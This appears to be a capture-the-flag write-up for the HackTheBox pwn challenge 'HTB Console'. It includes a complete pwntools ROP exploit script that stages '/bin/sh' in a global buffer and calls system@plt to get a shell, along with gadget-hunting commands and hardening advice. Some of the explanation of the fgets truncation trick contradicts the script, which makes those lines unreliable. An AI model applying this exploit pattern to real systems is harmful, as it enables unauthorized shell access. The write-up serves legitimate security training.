---
layout: post
title: "HTB Challenge: HTB Console"
date: 2027-06-07 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, rop, ret2system, no-pie, no-canary, cwe-121, bss-staging, fgets-truncation]
---

A No-PIE, No-canary pwn challenge whose twist is that you never need a libc leak. One hidden write primitive stages `/bin/sh` in a static buffer; a second, obvious overflow lets you call `system()` on it directly.

## Overview

**HTB Console** is an Easy Pwn challenge. You get a 64-bit ELF that presents a fake interactive console with five commands: `id`, `dir`, `flag`, `hof`, and `date`. The binary has no stack canary, no PIE, and NX enabled — but `system@plt` is already present (the `date` command calls `system("date")`), so no libc mapping is needed.

The `flag` command has an obvious [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html): `fgets(rbp-0x10, 0x30, stdin)` reads 48 bytes into a 16-byte buffer. The non-obvious part is *how to call `system("/bin/sh")`* without a libc leak — the string `/bin/sh` doesn't exist in the binary. The `hof` command is the answer: `fgets(0x4040b0, 10, stdin)` writes user input to a **fixed global BSS address**. Stage `/bin/sh` there first, then ROP to it.

## The technique

Two-phase ret2system on a No-PIE / No-canary binary:

1. **Side-write primitive.** The `hof` command calls `fgets(global_buf, 10, stdin)`, where `global_buf` is at address `0x4040b0` — a fixed BSS location that never moves on a No-PIE binary. Send `/bin/sh` here before triggering the overflow.

2. **Stack buffer overflow.** The `flag` command calls `fgets(rbp-0x10, 0x30, stdin)`. The buffer is 16 bytes below `rbp`; the saved return address is 8 bytes above `rbp` — offset **24 bytes** from the buffer start. Past that, the ROP chain: `pop rdi; ret → 0x4040b0 → system@plt`.

3. **fgets truncation trick.** `fgets(buf, 48, stdin)` reads **47 bytes** from stdin and then appends a `NUL` byte itself. All x86-64 virtual addresses above `0x00400000` end in one or more `0x00` bytes — so the last byte of `system@plt` (`0x0000000000401040`) is `0x00`, supplied for free by `fgets`. Send `payload[:-1]` (47 bytes) and the complete 3-gadget chain fits inside the 48-byte `fgets` limit without truncation.

Gadget hunting is offline — No-PIE means every address is static:

```bash
checksec --file=htb-console
# No canary, No PIE, NX enabled

ROPgadget --binary htb-console | grep 'pop rdi'
# 0x0000000000401473 : pop rdi ; ret

objdump -d htb-console | grep 'system@plt' -A1
# 0x401040 <system@plt>

nm htb-console | grep -i global
# 0x4040b0 B global_buf  (hof's fgets destination)
```

## Solution

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = ELF('./htb-console')

system_plt = 0x401040   # system@plt — binary calls system("date"), so PLT entry exists
pop_rdi    = 0x401473   # pop rdi; ret
bin_sh_buf = 0x4040b0   # fixed BSS buffer written by 'hof' fgets(buf, 10, stdin)

OVERFLOW_OFFSET = 24    # fgets(rbp-0x10, …): 16B buf + 8B saved_rbp

def exploit(io):
    # Phase 1: plant "/bin/sh" at the static global buffer
    io.recvuntil(b'>> ')
    io.sendline(b'hof')
    io.recvuntil(b'Enter your name: ')
    io.sendline(b'/bin/sh')

    # Phase 2: overflow the return address via 'flag'
    io.recvuntil(b'>> ')
    io.sendline(b'flag')
    io.recvuntil(b'Enter flag: ')

    payload = flat(
        b'A' * OVERFLOW_OFFSET,
        p64(pop_rdi),       # pop rdi; ret  →  rdi = address of "/bin/sh"
        p64(bin_sh_buf),    # 0x4040b0 = our staged "/bin/sh" string
        p64(system_plt),    # system("/bin/sh")
    )
    io.send(payload[:47])   # fgets supplies the final 0x00 of system_plt for free
    io.recvline()           # "Whoops, wrong flag!"
    io.interactive()

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        io = process('./htb-console')
    exploit(io)
```

Run it against the spawned docker instance:

```bash
python3 solve.py <docker_ip> <docker_port>
# uid=0(root) gid=0(root) groups=0(root)
# cat /home/ctf/flag.txt → HTB{...}
```

## Why it worked

The binary author gave users a way to register their name in a Hall of Fame (`hof`) and a way to submit the flag (`flag`) — two completely separate features. The `hof` path silently writes user input to a *fixed, known memory address* because No-PIE keeps all BSS addresses constant. The `flag` path has an unchecked `fgets` that overflows its buffer. Combined, the attacker controls both the *argument* to `system()` (via `hof`) and the *control flow* (via the `flag` overflow) without ever leaking a libc address.

The fgets truncation trick eliminates the need for an alignment `ret` gadget: since the last byte of every high-VA pointer is `0x00`, sending `n-2` bytes and letting `fgets` append the `NUL` terminator correctly reconstructs the full 8-byte address. This saves 8 bytes — exactly what's needed to fit 3 gadgets in a 48-byte window.

## Fix / defense

- Compile with `-fstack-protector-strong` — a stack canary makes the saved-return-address overwrite fatal before the `ret`.
- Compile with `-fPIE -pie` — ASLR randomises both the BSS address (defeating the staged `/bin/sh`) and the PLT stubs (defeating the static `system@plt`).
- Remove the global write path (`hof`) or at minimum write to a stack-local buffer, so no fixed writable address is reachable.
- Bound every `fgets`/`read` call to `sizeof(destination)`.
- Do not call `system()` anywhere in the binary; if `system@plt` is absent, the attack requires a libc leak first.
